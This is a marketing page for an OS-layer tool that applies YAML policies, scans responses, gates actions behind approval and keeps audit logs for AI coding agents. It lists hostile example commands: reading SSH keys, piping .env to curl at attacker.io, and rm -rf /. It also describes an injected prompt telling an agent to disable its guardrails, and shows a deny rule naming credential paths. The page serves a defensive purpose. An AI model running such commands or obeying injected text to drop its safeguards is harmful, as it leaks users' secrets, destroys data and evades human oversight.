The problem

The real threat isn't theoretical

Claude Code runs with --dangerously-skip-permissions. Codex runs with --full-auto. Here's what that means.

cat ~/.ssh/id_rsa Your private keys, exfiltrated in one read
cat .env | curl -X POST https://attacker.io Every secret in your environment, gone
rm -rf / Your filesystem. All of it.

An injected prompt tells your agent to disable its own guardrails? Rampart runs at the OS layer. The agent can't edit its way out.

Built-in protection

A seatbelt, not a cage

Five layers between your agent and disaster. Each one independent.

🛡️
Policy enforcement
Every command, file access, and network request evaluated against your YAML policy before it executes. Pattern matching handles 95%+ of decisions instantly.
🔒
Response scanning
If your agent reads a file containing credentials, the response is blocked before those secrets enter the agent's context window. Not just command blocking — output filtering.
👤
Approval gates
Outbound HTTP, package installs, or anything you flag — the agent pauses and asks you before running it. You set the rules, or use ours.
📋
Tamper-evident audit
Hash-chained JSONL audit log. See exactly what your agent does, then generate rules from the audit log. Policy modifications must be made by a human.

Policy format

It's just YAML

40+ built-in rules, or write your own. No SDK, no DSL, no proprietary config language.

version: "1"
policies:
  - name: block-credential-leak
    match:
      tool: file.read
    rules:
      - when:
          path_matches: ["**/.env", "**/.ssh/*", "**/id_rsa"]
        action: deny
        message: "Credential access blocked"

  - name: require-approval-outbound
    match:
      tool: http
    rules:
      - when:
          url_not_in_allowlist: true
        action: require-approval
